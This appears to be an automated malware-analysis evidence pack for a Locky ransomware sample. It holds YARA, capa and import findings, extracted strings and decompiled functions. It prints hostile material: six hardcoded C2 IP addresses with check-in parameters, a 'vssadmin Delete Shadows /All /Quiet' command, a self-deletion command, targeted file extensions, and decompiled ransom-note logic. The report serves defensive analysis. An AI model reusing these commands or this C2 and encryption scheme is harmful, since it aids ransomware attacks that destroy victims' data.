# Technical Evidence Pack

**sha256:** 28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb  
**sample_path:** /opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe  
**project_name:** malware

> Every table below is copied from stage JSON. Technical narrative must cite these rows (engine + address/rule), not invent evidence.

## Verdict
- **verdict**: malicious
- **score**: 40.0
- **family_guess**: Locky
- **confidence**: 40
- **agreement**: llm_and_v1_agree
- **cross_engine_notes**: Multiple tools (Ghidra, IDA, Malcat, Capa, YARA, pe_imports, external TI) consistently indicate ransomware behavior, including encryption, shadow copy deletion, C2 communication, and persistence. YARA rule directly matches Locky ransomware, and decompiled code references ransomware instructions.
- **summary**: The sample is a 32-bit Windows executable (svchost.exe) identified as Locky ransomware. It exhibits multiple malicious behaviors including file encryption using cryptographic APIs (e.g., CryptEncrypt), deletion of volume shadow copies via vssadmin.exe, HTTP-based C2 communication, and registry modifications for persistence. Evidence from static analysis, YARA rules (direct Locky match), decompilation (references to ransom instructions), and external threat intelligence (VirusTotal) confirms its ransomware nature with high confidence.
- **source**: llm_judge
- **model**: mimo-v2.5-pro

### key_evidence (triage) — cite source field exactly
| source | query_or_table | row_or_rule | why |
|---|---|---|---|
| malcat | YARA matches | `Locky_Ransomware_2` | Direct YARA match for Locky ransomware family, confirming malicious identity. |
| malcat | Strings/suspicious | `vssadmin.exe Del..dows /All /Quiet` | Command to delete volume shadow copies, a key ransomware behavior to inhibit system recovery (ATT&CK T1490). |
| ghidra | Suspicious strings | `address 4287880: CryptDestroyKey` | Presence of cryptographic API strings (e.g., CryptDestroyKey) indicates capability for data encryption. |
| ida | Suspicious strings | `CryptDestroyKey at 0x416D88` | Cross-verification of crypto API usage from IDA analysis, supporting encryption intent. |
| malcat | Anomalies | `CryptoApiUsage` | High-signal anomaly with 24 hits, showing extensive use of cryptographic functions for encryption. |
| capa | top_rules | `delete volume shadow copies` | Capa rule mapped to ATT&CK T1490, demonstrating intent to inhibit system recovery through shadow copy deletion. |
| malcat | Decompilations | `sub_403d8a` | Decompiled code references 'Locky_recover_instructions.txt' and '.bmp', confirming deployment of ransomware recovery not |
| pe_imports | signals | `crypto_encrypt (CryptEncrypt)` | High-signal import for encryption (CryptEncrypt), consistent with ransomware payload behavior. |
| external_ti | VirusTotal | `threat_class with locky` | External threat intelligence from VirusTotal shows 66 malicious detections and popular threat name 'locky', corroboratin |
| malcat | Strings/registry | `Software\Locky` | Registry key 'Software\Locky' indicates persistence mechanism and association with Locky ransomware family. |

## Deep-Dive Summary Evidence
- **source**: deep_dive_agentic
- **confidence**: 99
- **summary**: This sample is Locky ransomware. It encrypts victim files using the Windows CryptoAPI (CryptEncrypt with RSA/AES), appends the .locky extension, drops a ransom note (\_Locky_recover_instructions.txt), deletes Volume Shadow Copies via vssadmin to prevent recovery, reports encryption statistics to six hardcoded C2 IP addresses over HTTP, and self-deletes after execution. YARA rule Locky_Ransomware_2 matched with 7 distinct string patterns. The binary imports a full cryptographic pipeline (CryptAcquireContextA, CryptCreateHash, CryptHashData, CryptImportKey, CryptSetKeyParam, CryptEncrypt, CryptGenRandom), anti-debugging via IsDebuggerPresent, and HTTP client APIs for C2 communication. Persistence: Not observed in the provided analysis evidence. Exfiltration: Not observed; no tools or mechanisms for data theft were identified in the binary or YARA rule match. Defense impairment: Observed evidence includes the use of vssadmin to delete Volume Shadow Copies, preventing system recovery, and anti-debugging via IsDebuggerPresent to evade analysis, as cited from the binary import analysis.

### deep key_evidence
- `"YARA rule Locky_Ransomware_2 matched with 7 distinct string patterns at offsets 76020-76700"`
- `"String at 0x4112D4: '.locky' \u2014 ransomware file extension appended to encrypted files"`
- `"String at 0x411310: '\\_Locky_recover_instructions.txt' \u2014 ransom note dropped on desktop"`
- `"String at 0x4113EC: '&encrypted=' and 0x4113F8: '&act=stats&path=' \u2014 C2 reporting of encryption stats"`
- `"String at 0x413400: '91.195.12.187,195.64.154.114,149.202.109.205,51.254.181.122,78.40.108.39,188.127.231.116' \u2014 six hardcoded C2 server IPs"`
- `"String at 0x413800: 'vssadmin.exe Delete Shadows /All /Quiet' \u2014 deletes shadow copies to prevent file recovery"`
- `"String at 0x41392C: 'cmd.exe /C del /Q /F \"' \u2014 self-deletion after payload execution"`
- `"Imports: CryptAcquireContextA, CryptCreateHash, CryptHashData, CryptImportKey, CryptSetKeyParam, CryptEncrypt, CryptGenRandom from ADVAPI32.DLL \u2014 full crypto pipeline for file encryption"`
- `"Import signals: crypto_encrypt (T1573), http_client (T1071.001), check_debugger (T1622), set_registry_value (T1112), create_process (T1106)"`
- `"Function FUN_00404044 at 0x404044: complexity=143, 21 string refs, 91 outgoing calls \u2014 likely main ransomware orchestration logic"`

## Malcat Structured Analysis
### Malcat File Summary
```
sha256: 28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb
size: 104448
type: PE
architecture: X86
entrypoint_ea: 40820
entropy: 6.13
file_name: svchost.exe
```

### File Layout (sections/regions)
| Name | EA | Physical | Virtual | Entropy | Rights |
|---|---|---|---|---|---|
| header | 0 | 1024 | 0 | 44 | - |
| .text | 1024 | 64512 | 65536 | 140 | RX |
| .rdata | 66560 | 26112 | 28672 | 70 | R |
| .data | 95232 | 3584 | 8192 | 60 | RW |
| .reloc | 103424 | 9216 | 12288 | 67 | R |

### Malcat YARA / Signatures (10)
| Rule | Category | Type | Reliability | Description |
|---|---|---|---|---|
| MSVC_2002_linker | compiler | INFO | 60 | detects used visual studio version based on linker information |
| MSVC_2003_rich | compiler | INFO | 80 | detects used visual studio version based on rich header information |
| ZoneAlternateStream | network | UNCOMMON | 60 | program tries to manipulate internet alternate streams |
| DownloadUsingWininet | network | UNCOMMON | 60 | can download files from internet using wininet API |
| AccessNetworkShares | network | SUSPICIOUS | 70 | may access network shares |
| FingerprintHardware | fingerprint | UNCOMMON | 50 | tries to enumerate installed hardware |
| AutorunKey | persistence | UNCOMMON | 20 | file contains path of an autorun key |
| DeletesVssShadowCopy | destruction | SUSPICIOUS | 80 | attempts to remove vss shadow copies, a classical ransomware move |
| ValuableFileExtensions | destruction | UNCOMMON | 10 | embeds a list of file extensions often targeted by ransomwares |
| RunShell | lateral movement | UNCOMMON | 70 | starts a shell |

### Anomalies (7)
| Name | Level | Category | Hits | Description |
|---|---|---|---|---|
| RichMultipleLinkers | 3 | rich | 1 | multiple linker entries in rich header |
| StackArrayInitialisationX86 | 3 | code | 1 | An array of data is dynamically built on the stack, sometimes used to build shellcodes or strings |
| XorInLoop | 3 | code | 15 | XOR instruction in a loop |
| CryptoApiUsage | 2 | imports | 24 | Crypto-related apis are used |
| DownloaderApiUsage | 2 | imports | 2 | Downloader-related apis are used |
| NoChecksum | 1 | integrity | 1 | PE Header checksum is not set |
| SpaghettiFunction | 1 | code | 3 | Function with lots of intra jumps, could be obfuscated |

### Anomaly Locations (high-signal)
- **CryptoApiUsage**
  - `9086`: 
  - `9111`: 
  - `9209`: 
  - `10276`: 
  - `10323`: 
- **NoChecksum**
  - `304`: 
- **SpaghettiFunction**
  - `37520`: 
  - `48631`: 
  - `56272`: 
- **XorInLoop**
  - `1653`: 
  - `1699`: 
  - `2895`: 
  - `3470`: 
  - `25609`: 

### High-Signal Strings (9 matched keywords; engine=malcat)
| EA | String |
|---|---|
| 78092 | `cmd.exe /C del /Q /F "` |
| 80776 | `wallet.dat` |
| 78052 | `kernel32.dll` |
| 73092 | `GetProcessWindowStation` |
| 78212 | `http://` |
| 78160 | `HTTP/1.1` |
| 77212 | `&encrypted=` |
| 77744 | `pubkey` |
| 90170 | `KERNEL32.dll` |

### Top Strings (300 extracted; showing 80)
| EA | String |
|---|---|
| 77936 | `Software\Microso..rrentVersion\Run` |
| 77856 | `vssadmin.exe Del..dows /All /Quiet` |
| 78092 | `cmd.exe /C del /Q /F "` |
| 77796 | `:Zone.Identifier` |
| 78988 | `.tar.bz2` |
| 79072 | `.rar` |
| 79800 | `.001` |
| 80284 | `.xlsx` |
| 80092 | `.pptx` |
| 77584 | `\_Locky_recover_instructions.bmp` |
| 78916 | `.vmdk` |
| 80488 | `.docm` |
| 80500 | `.docx` |
| 79192 | `.jpeg` |
| 80296 | `.xlsm` |
| 80752 | `.crt` |
| 80716 | `.pem` |
| 80620 | `.pdf` |
| 80200 | `.odp` |
| 79628 | `.sql` |
| 80548 | `.3ds` |
| 78744 | `.mp4` |
| 78756 | `.mov` |
| 78768 | `.avi` |
| 78876 | `.mp3` |
| 79032 | `.tar` |
| 79144 | `.png` |
| 79204 | `.jpg` |
| 80428 | `.ods` |
| 77120 | `\_Locky_recover_instructions.txt` |
| 78172 | `rupweuinytpmusfr..euknltf/main.php` |
| 77008 | `0123456789ABCDEF` |
| 79084 | `.zip` |
| 79044 | `.tgz` |
| 77772 | `svchost.exe` |
| 70024 | `mscoree.dll` |
| 80776 | `wallet.dat` |
| 73192 | `USER32.DLL` |
| 78140 | `0123456789ABCDEF` |
| 78304 | `_Locky_recover_instructions.txt` |
| 78240 | `_Locky_recover_instructions.bmp` |
| 76783 | `91.195.12.187,19..,188.127.231.116` |
| 90112 | `GetVolumeInformationW` |
| 77724 | `Software\Locky` |
| 91270 | `InternetReadFile` |
| 78052 | `kernel32.dll` |
| 77460 | `Windows Server 2..echnical Preview` |
| 91318 | `WNetEnumResourceW` |
| 78020 | `Wow64DisableWow64FsRedirection` |
| 91000 | `ShellExecuteW` |
| 73092 | `GetProcessWindowStation` |
| 91302 | `WNetOpenEnumW` |
| 77224 | `&act=stats&path=` |
| 73116 | `GetUserObjectInformationW` |
| 77696 | `TileWallpaper` |
| 77832 | `&act=gettext&lang=` |
| 90136 | `GetLogicalDrives` |
| 77680 | `WallpaperStyle` |
| 77652 | `Control Panel\Desktop` |
| 67396 | `Unknown exception` |
| 73144 | `GetLastActivePopup` |
| 77556 | `&act=getkey&affid=` |
| 77500 | `unknown` |
| 78212 | `http://` |
| 70924 | `FlsFree` |
| 70956 | `FlsAlloc` |
| 77096 | `invalid string position` |
| 78068 | `IsWow64Process` |
| 78160 | `HTTP/1.1` |
| 77424 | `Windows Server 2012 R2` |
| 77356 | `Windows Server 2008 R2` |
| 70008 | `CorExitProcess` |
| 73164 | `GetActiveWindow` |
| 77044 | `.locky` |
| 76996 | `.tmp` |
| 77392 | `Windows Server 2012` |
| 77324 | `Windows Server 2008` |
| 73180 | `MessageBoxW` |
| 70932 | `FlsSetValue` |
| 77712 | `open` |

### Constants / Known Patterns (30)
| Category | Value |
|---|---|
| registry | `registry::HKEY_CURRENT_USER` |
| exception | `exception::C++ exception` |
| exception | `exception::FuncInfo header` |
| exception | `exception::CLR exception` |
| registry | `registry::HKEY_USERS` |
| runtime | `runtime::msvc_tloss_error` |
| runtime | `runtime::msvc_sing_error` |
| runtime | `runtime::msvc_domain_error` |
| runtime | `runtime::msvc_r6033` |
| runtime | `runtime::msvc_r6032` |
| runtime | `runtime::msvc_r6031` |
| runtime | `runtime::msvc_r6030` |
| runtime | `runtime::msvc_r6028` |
| runtime | `runtime::msvc_r6027` |
| runtime | `runtime::msvc_r6026` |
| runtime | `runtime::msvc_r6025` |
| runtime | `runtime::msvc_r6024` |
| runtime | `runtime::msvc_r6019` |
| runtime | `runtime::msvc_r6018` |
| runtime | `runtime::msvc_r6017` |
| runtime | `runtime::msvc_r6016` |
| runtime | `runtime::msvc_r6010` |
| runtime | `runtime::msvc_r6009` |
| runtime | `runtime::msvc_r6008` |
| runtime | `runtime::msvc_r6002` |
| runtime | `runtime::msvc_rl` |
| runtime | `runtime::msvc_name_unknown` |
| runtime | `runtime::msvc_runtime_error` |
| runtime | `runtime::msvc_date` |
| registry | `registry::autorun` |

### Imports (373)
| EA | Name | Type | Refs |
|---|---|---|---|
| 1031 | fmiussy.#0 | DEBUG | 1 |
| 1128 | wesioyitxu.#0 | DEBUG | 1 |
| 1232 | wesioyitxu.#2 | DEBUG | 2 |
| 1410 | wesioyitxu.#1 | DEBUG | 1 |
| 1479 | wesioyitxu.#3 | DEBUG | 2 |
| 1774 | wesioyitxu.#4 | DEBUG | 1 |
| 1833 | cuovxnupr.#0 | DEBUG | 3 |
| 2125 | ssphl.#0 | DEBUG | 1 |
| 2735 | ssphl.#1 | DEBUG | 1 |
| 2807 | ssphl.#2 | DEBUG | 2 |
| 2873 | ssphl.#3 | DEBUG | 2 |
| 3506 | ssphl.#4 | DEBUG | 1 |
| 3602 | pylqeirxupohx.#0 | DEBUG | 1 |
| 36707 | rebixaldhajxr.#0 | DEBUG | 3 |
| 36767 | ylkuqdbg.#0 | DEBUG | 1 |
| 36800 | type_info.operator== | DEBUG | 1 |
| 36832 | fmiussy.#4 | DEBUG | 4 |
| 36832 | __purecall | DEBUG | 4 |
| 36874 | __aligned_offset_malloc | DEBUG | 1 |
| 37052 | __aligned_malloc | DEBUG | 1 |
| 37075 | std.exception.exception | DEBUG | 2 |
| 37104 | bcwq.#1 | DEBUG | 6 |
| 37117 | std.exception._Copy_str | DEBUG | 2 |
| 37181 | std.exception._Tidy | DEBUG | 3 |
| 37211 | std.exception.exception | DEBUG | 4 |
| 37250 | std.exception.operator= | DEBUG | 1 |
| 37314 | uhqirfiliupnl.#0 | DEBUG | 1 |
| 37353 | std.exception.exception | DEBUG | 7 |
| 37390 | operator new | DEBUG | 9 |
| 38385 | __onexit_nolock | DEBUG | 1 |
| 38567 | ___onexitinit | DEBUG | 1 |
| 38616 | __onexit | DEBUG | 1 |
| 38676 | _atexit | DEBUG | 11 |
| 38699 | _LocaleUpdate._LocaleUpdate | DEBUG | 7 |
| 38834 | __wcsnicmp_l | DEBUG | 1 |
| 39063 | __wcsnicmp | DEBUG | 1 |
| 39221 | _xtoa@16 | DEBUG | 1 |
| 39288 | __ultoa | DEBUG | 1 |
| 39314 | @x64toa@20 | DEBUG | 1 |
| 39425 | __ui64toa | DEBUG | 1 |
| 39454 | _malloc | DEBUG | 9 |
| 39664 | _memchr | DEBUG | 1 |
| 39837 | __wcsicmp_l | DEBUG | 1 |
| 40096 | __wcsicmp | DEBUG | 2 |
| 40235 | __towlower_l | DEBUG | 5 |
| 40395 | _towlower | DEBUG | 1 |
| 40414 | _fast_error_exit | DEBUG | 2 |
| 40455 | ___tmainCRTStartup | DEBUG | 1 |
| 40820 | _mainCRTStartup | DEBUG | 1 |
| 40830 | __CxxThrowException@8 | DEBUG | 64 |
| 41024 | _strcmp | DEBUG | 2 |
| 41160 | _abort | DEBUG | 2 |
| 41211 | __set_abort_behavior | DEBUG | 1 |
| 41244 | __GET_RTERRMSG | DEBUG | 1 |
| 41282 | __NMSG_WRITE | DEBUG | 7 |
| 41713 | __FF_MSGBANNER | DEBUG | 4 |
| 41800 | __call_reportfault | DEBUG | 2 |
| 42097 | __invoke_watson | DEBUG | 3 |
| 42134 | __invalid_parameter | DEBUG | 1 |
| 42179 | __invalid_parameter_noinfo | DEBUG | 14 |
| 42195 | __get_errno_from_oserr | DEBUG | 3 |
| 42261 | __errno | DEBUG | 30 |
| 42336 | _memset | DEBUG | 10 |
| 42458 | _strcpy_s | DEBUG | 2 |
| 42560 | _strlen | DEBUG | 4 |
| 42714 | __callnewh | DEBUG | 6 |
| 42754 | __VEC_memcpy | DEBUG | 2 |
| 43252 | ___crtCorExitProcess | DEBUG | 1 |
| 43319 | __lockexit | DEBUG | 1 |
| 43328 | __unlockexit | DEBUG | 1 |
| 43337 | __init_pointers | DEBUG | 1 |
| 43388 | __initterm_e | DEBUG | 1 |
| 43424 | __cinit | DEBUG | 1 |
| 43575 | _doexit | DEBUG | 4 |
| 43917 | __exit | DEBUG | 4 |
| 43939 | __cexit | DEBUG | 1 |
| 43954 | __c_exit | DEBUG | 1 |
| 44000 | __SEH_prolog4 | DEBUG | 18 |
| 44096 | __except_handler4 | DEBUG | 2 |
| 44495 | CPtoLCID | DEBUG | 2 |

### Functions (30)
| EA | Name |
|---|---|
| 60365 | sub_40f7cd |
| 13380 | sub_404044 |
| 12682 | sub_403d8a |
| 59760 | sub_40f570 |
| 1479 | #3 |
| 25276 | sub_406ebc |
| 52135 | sub_40d7a7 |
| 51280 | sub_40d450 |
| 2873 | #3 |
| 57392 | sub_40ec30 |
| 64860 | sub_41095c |
| 4218 | sub_401c7a |
| 11709 | sub_4039bd |
| 23628 | sub_40684c |
| 28502 | sub_407b56 |
| 10432 | sub_4034c0 |
| 29717 | sub_408015 |
| 30161 | sub_4081d1 |
| 28839 | sub_407ca7 |
| 21348 | sub_405f64 |
| 1889 | sub_401361 |
| 9353 | sub_403089 |
| 21910 | sub_406196 |
| 1232 | #2 |
| 26620 | sub_4073fc |
| 9118 | sub_402f9e |
| 20702 | sub_405cde |
| 19811 | sub_405963 |
| 28350 | sub_407abe |
| 23166 | sub_40667e |

### Decompilations (top 6)
#### 60365 — sub_40f7cd
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_40f7cd(void)

{
    int32_t *piVar1;
    int32_t iVar2;
    int32_t unaff_EBP;
    
    piVar1 = *(unaff_EBP + 8);
    *(*(unaff_EBP + 0xc) + -4) = *(unaff_EBP + -0x24);
    __FindAndUnlinkFrame(*(unaff_EBP + -0x28));
    iVar2 = __getptd();
    *(iVar2 + 0x88) = *(unaff_EBP + -0x2c);
    iVar2 = __getptd();
    *(iVar2 + 0x8c) = *(unaff_EBP + -0x30);
    if ((((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) &&
        ((iVar2 = piVar1[5], iVar2 == 0x19930520 || ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))) &&
       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {
        iVar2 = __IsExceptionObjectToBeDestroyed(piVar1[6]);
        if (iVar2 != 0) {
            sub_40f570(piVar1, *(unaff_EBP + 0x10));
        }
    }
    return;
}

```
#### 13380 — sub_404044
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_404044(void)

{
    char cVar1;
    uint16_t uVar2;
    int32_t iVar3;
    code *pcVar4;
    char *pcVar5;
    char *pcVar6;
    undefined4 uVar7;
    int32_t iVar8;
    char *pcVar9;
    int32_t unaff_EBP;
    undefined4 *puVar10;
    undefined4 uStack_2fc;
    undefined4 uStack_2f8;
    undefined4 uStack_2f4;
    int32_t iStack_2f0;
    undefined4 uStack_2ec;
    int32_t iStack_2e8;
    int32_t iStack_2e4;
    undefined *puStack_2e0;
    code *pcStack_2dc;
    int32_t iStack_2d8;
    int32_t iStack_2d4;
    int32_t iStack_2d0;
    undefined4 uStack_2cc;
    undefined4 uStack_2c8;
    char *pcStack_2c4;
    char *pcStack_2c0;
    char *pcStack_2bc;
    int32_t iStack_2b8;
    char *pcStack_2b4;
    char *pcStack_2b0;
    char *pcStack_2ac;
    undefined4 uStack_2a8;
    int32_t iStack_2a4;
    undefined4 uStack_2a0;
    undefined4 uStack_29c;
    undefined4 uStack_298;
    int32_t iStack_294;
    code *pcStack_290;
    undefined4 uStack_28c;
    
    __EH_prolog();
    *(unaff_EBP + -0x10) = &stack0xfffffd78;
    uStack_28c = 0x8003;
    pcStack_290 = 0x404065;
    (*kernel32.SetErrorMode)();
    pcStack_290 = sub_403066;
    iStack_294 = 0x404070;
    (*kernel32.SetUnhandledExceptionFilter)();
    iStack_294 = unaff_EBP + -0x28;
    pcVar9 = 0x0;
    uStack_298 = 0x80;
    *(unaff_EBP + -0x54) = 0;
    uStack_29c = 0x404084;
    uStack_29c = (*kernel32.GetCurrentProcess)();
    uStack_2a0 = 0x40408b;
    iVar3 = (*advapi32.OpenProcessToken)();
    if (iVar3 != 0) {
        uStack_2a0 = 4;
        iStack_2a4 = unaff_EBP + -0x54;
        uStack_2a8 = 0x18;
        pcStack_2ac = *(unaff_EBP + -0x28);
        pcStack_2b0 = 0x4040a0;
        (*advapi32.SetTokenInformation)();
        pcStack_2b0 = *(unaff_EBP + -0x28);
        pcStack_2b4 = 0x4040a9;
        (*kernel32.CloseHandle)();
    }
    uStack_2a0 = "Wow64DisableWow64FsRedirection";
    iStack_2a4 = "kernel32.dll";
    uStack_2a8 = 0x4040b9;
    uStack_2a8 = (*kernel32.GetModuleHandleA)();
    pcStack_2ac = 0x4040c0;
    pcVar4 = (*kernel32.GetProcAddress)();
    if (pcVar4 != 0x0) {
        pcStack_2ac = unaff_EBP + -0x30;
        pcStack_2b0 = 0x4040ca;
        (*pcVar4)();
    }
    *(unaff_EBP + -4) = 0;
    if (["91.195.12.187,195.64.154.114,149.202.109.205,51.254.181.122,78.40.108.39,188.127.231.116"] != '\0') {
        *(unaff_EBP + -0x38) = 0xf;
        *(unaff_EBP + -0x3c) = 0;
        *(unaff_EBP + -0x4c) = 0;
        pcVar6 = "91.195.12.187,195.64.154.114,149.202.109.205,51.254.181.122,78.40.108.39,188.127.231.116";
        do {
            pcVar5 = pcVar6;
            pcVar6 = pcVar5 + 1;
        } while (*pcVar5 != '\0');
        pcVar5 = pcVar5 + -0x4137ef;
        pcStack_2ac = "91.195.12.187,195.64.154.114,149.202.109.205,51.254.181.122,78.40.108.39,188.127.231.116";
        pcStack_2b0 = 0x404106;
        cVar1 = sub_405579();
        iStack_2b8 = unaff_EBP + -0x4c;
        if (cVar1 == '\0') {
            pcStack_2b0 = 0x0;
            iStack_2b8 = 0x404120;
            pcStack_2b4 = pcVar5;
            cVar1 = sub_4057d7();
            if (cVar1 != '\0') {
                pcStack_2c4 = *(unaff_EBP + -0x4c);
                if (*(unaff_EBP + -0x38) < 0x10) {
                    pcStack_2c4 = unaff_EBP + -0x4c;
                }
                pcStack_2c0 = "91.195.12.187,195.64.154.114,149.202.109.205,51.254.181.122,78.40.108.39,188.127.231.116"
                ;
                uStack_2c8 = 0x404138;
                pcStack_2bc = pcVar5;
                sub_40e7d0();
                iVar3 = *(unaff_EBP + -0x4c);
                *(unaff_EBP + -0x3c) = pcVar5;
                if (*(unaff_EBP + -0x38) < 0x10) {
                    iVar3 = unaff_EBP + -0x4c;
                }
                pcVar5[iVar3] = '\0';
            }
        }
        else {
            pcStack_2b4 = "91.195.12.187,195.64.154.114,149.202.109.205,51.254.181.122,78.40.108.39,188.127.231.116" - iStack_2b8;
          
```
#### 12682 — sub_403d8a
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_403d8a(void)

{
    code *pcVar1;
    char cVar2;
    undefined4 uVar3;
    int32_t iVar4;
    int32_t unaff_EBP;
    undefined *puVar5;
    undefined4 *unaff_FS_OFFSET;
    
    __EH_prolog();
    sub_4052d4(unaff_EBP + -0x88);
    *(unaff_EBP + -4) = 0;
    sub_404b68(unaff_EBP + -0x6c, unaff_EBP + -0x88, "\\_Locky_recover_instructions.txt");
    *(unaff_EBP + -4) = 1;
    sub_404b68(unaff_EBP + -0x48, unaff_EBP + -0x88, "\\_Locky_recover_instructions.bmp");
    *(unaff_EBP + -4) = 2;
    cVar2 = sub_405cde();
    if (cVar2 == '\0') {
        iVar4 = *(unaff_EBP + -0x6c);
        if (*(unaff_EBP + -0x58) < 8) {
            iVar4 = unaff_EBP + -0x6c;
        }
        sub_405d28(iVar4);
    }
    cVar2 = sub_405cde();
    if (cVar2 == '\0') {
        uVar3 = sub_405c7b(unaff_EBP + -0xa4);
        *(unaff_EBP + -4) = 3;
        sub_4039bd(unaff_EBP + -0x28, uVar3);
        *(unaff_EBP + -4) = 5;
        sub_402d33(1);
        iVar4 = *(unaff_EBP + -0x48);
        if (*(unaff_EBP + -0x34) < 8) {
            iVar4 = unaff_EBP + -0x48;
        }
        sub_405d28(iVar4);
        *(unaff_EBP + -4) = 2;
        sub_4059f4(1);
    }
    iVar4 = (*advapi32.RegOpenKeyExA)(0x80000001, "Control Panel\\Desktop", 0, 0x2001f, unaff_EBP + -0x2c);
    if (iVar4 != 0) {
        *(unaff_EBP + -0x4c) = iVar4;
        *(unaff_EBP + -0x50) = &livsx.Vtable;
        __CxxThrowException@8(unaff_EBP + -0x50, 0x414fbc);
    }
    *(unaff_EBP + -4) = 6;
    *(unaff_EBP + -0x18) = 0;
    *(unaff_EBP + -0x14) = 0xf;
    *(unaff_EBP + -0x28) = 0;
    cVar2 = sub_405579(0x413b6c);
    if (cVar2 == '\0') {
        cVar2 = sub_4057d7(1, 0);
        if (cVar2 != '\0') {
            puVar5 = *(unaff_EBP + -0x28);
            if (*(unaff_EBP + -0x14) < 0x10) {
                puVar5 = unaff_EBP + -0x28;
            }
            *puVar5 = [0x0x413b6c];
            iVar4 = *(unaff_EBP + -0x28);
            *(unaff_EBP + -0x18) = 1;
            if (*(unaff_EBP + -0x14) < 0x10) {
                iVar4 = unaff_EBP + -0x28;
            }
            *(iVar4 + 1) = 0;
        }
    }
    else {
        sub_405625(unaff_EBP + -0x28, 0x413b6c - (unaff_EBP + -0x28), 1);
    }
    *(unaff_EBP + -4) = 7;
    sub_404ce7(unaff_EBP + -0x2c, unaff_EBP + -0x28);
    *(unaff_EBP + -4) = 6;
    sub_4059f4(1);
    *(unaff_EBP + -0x18) = 0;
    *(unaff_EBP + -0x14) = 0xf;
    *(unaff_EBP + -0x28) = 0;
    cVar2 = sub_405579(0x413b6c);
    if (cVar2 == '\0') {
        cVar2 = sub_4057d7(1, 0);
        if (cVar2 != '\0') {
            puVar5 = *(unaff_EBP + -0x28);
            if (*(unaff_EBP + -0x14) < 0x10) {
                puVar5 = unaff_EBP + -0x28;
            }
            *puVar5 = [0x0x413b6c];
            iVar4 = *(unaff_EBP + -0x28);
            *(unaff_EBP + -0x18) = 1;
            if (*(unaff_EBP + -0x14) < 0x10) {
                iVar4 = unaff_EBP + -0x28;
            }
            *(iVar4 + 1) = 0;
        }
    }
    else {
        sub_405625(unaff_EBP + -0x28, 0x413b6c - (unaff_EBP + -0x28), 1);
    }
    *(unaff_EBP + -4) = 8;
    sub_404ce7(unaff_EBP + -0x2c, unaff_EBP + -0x28);
    sub_4059f4(1);
    iVar4 = *(unaff_EBP + -0x48);
    if (*(unaff_EBP + -0x34) < 8) {
        iVar4 = unaff_EBP + -0x48;
    }
    (*user32.SystemParametersInfoW)(0x14, 0, iVar4, 3);
    pcVar1 = shell32.ShellExecuteW;
    iVar4 = *(unaff_EBP + -0x6c);
    if (*(unaff_EBP + -0x58) < 8) {
        iVar4 = unaff_EBP + -0x6c;
    }
    (*shell32.ShellExecuteW)(0, "open", iVar4, 0, 0, 1);
    iVar4 = *(unaff_EBP + -0x48);
    if (*(unaff_EBP + -0x34) < 8) {
        iVar4 = unaff_EBP + -0x48;
    }
    (*pcVar1)(0, "open", iVar4, 0, 0, 1);
    if (*(unaff_EBP + -0x2c) != 0) {
        (*advapi32.RegCloseKey)(*(unaff_EBP + -0x2c));
    }
    sub_402d33(1);
    sub_402d33(1);
    sub_402d33(1);
    *unaff_FS_OFFSET = *(unaff_EBP + -0xc);
    return;
}

```

### Structures (24)
| Name | EA |
|---|---|
| MZ | 0 |
| RichHeader | 128 |
| PE | 216 |
| OptionalHeader | 240 |
| Sections | 464 |
| advapi32.FT | 66560 |
| gdi32.FT | 66664 |
| kernel32.FT | 66716 |
| mpr.FT | 67084 |
| netapi32.FT | 67104 |
| shell32.FT | 67116 |
| user32.FT | 67128 |
| wininet.FT | 67160 |
| ImportTable | 88356 |
| advapi32.OFT | 88536 |
| gdi32.OFT | 88640 |
| kernel32.OFT | 88692 |
| mpr.OFT | 89060 |
| netapi32.OFT | 89080 |
| shell32.OFT | 89092 |
| user32.OFT | 89104 |
| wininet.OFT | 89136 |
| ImportNames | 89192 |
| Relocations | 103424 |


## capa Capability Rules
engine: `malcat-capa` · Total rules: 50 · duration_s: 1.35

| Rule | ATT&CK | MBC |
|---|---|---|
| encode data using XOR | T1027:Obfuscated Files or Information | E1027.m02:Obfuscated Files or Information, C0026.002:Encode Data |
| encrypt or decrypt via WinCrypt | T1027:Obfuscated Files or Information | C0031:Decrypt Data, C0027:Encrypt Data |
| encrypt data using AES via x86 extensions | T1027:Obfuscated Files or Information | E1027.m05:Obfuscated Files or Information, C0027.001:Encrypt Data |
| delete volume shadow copies | T1490:Inhibit System Recovery, T1070.004:Indicator Removal | E1485.m04:Data Destruction |
| create new key via CryptAcquireContext | T1027:Obfuscated Files or Information | C0028:Encryption Key |
| get common file path | T1083:File and Directory Discovery | E1083:File and Directory Discovery |
| enumerate files on Windows | T1083:File and Directory Discovery | E1083:File and Directory Discovery |
| enumerate files recursively | T1083:File and Directory Discovery | E1083:File and Directory Discovery |
| get file size | T1083:File and Directory Discovery | E1083:File and Directory Discovery |
| set file attributes | T1222:File and Directory Permissions Modification | C0050:Set File Attributes |
| get disk information | T1082:System Information Discovery | E1082:System Information Discovery |
| get disk size | T1082:System Information Discovery | E1082:System Information Discovery |
| check OS version | T1082:System Information Discovery | E1082:System Information Discovery |
| query or enumerate registry value | T1012:Query Registry | C0036.006:Registry |
| delete registry value | T1112:Modify Registry | C0036.007:Registry |

## PE Imports / Signals
import_count: 156

| label | api_match | ATT&CK |
|---|---|---|
| check_debugger | IsDebuggerPresent | T1622 |
| crypto_encrypt | CryptEncrypt | T1573 |
| http_client | InternetOpen | T1071.001 |
| set_registry_value | RegSetValue | T1112 |
| create_process | CreateProcess | T1106 |
| shell_execute | ShellExecute | T1106 |
| load_library | LoadLibrary | T1129 |
| get_proc_address | GetProcAddress | T1129 |

## YARA Matches (pipeline)
Total matches: 24

| Rule | Namespace | Match strings (trimmed) |
|---|---|---|
| domain | - | $domain_regex@0 len=2 |
| IP | - | $ipv4@75759 len=13; $ipv6@96935 len=2 |
| Locky_Ransomware_2 | - | $a1@76020 len=13; $a2@76097 len=13; $a3@76110 len=13; $a4@76123 len=13; $a5@76136 len=13; $a6@76149 len=12; $a7@76700 len=15 |
